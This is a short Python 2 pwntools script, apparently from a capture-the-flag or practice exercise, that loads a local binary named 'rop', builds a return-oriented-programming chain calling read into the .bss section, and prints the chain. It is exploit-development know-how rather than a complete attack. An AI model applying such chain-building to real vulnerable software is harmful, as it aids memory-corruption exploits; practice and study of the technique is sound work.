from pwn import *
elf = ELF('/home/h11p/hackme/rop')
rop = ROP(elf)
rop.read(0, elf.bss(0x80))
print rop.dump()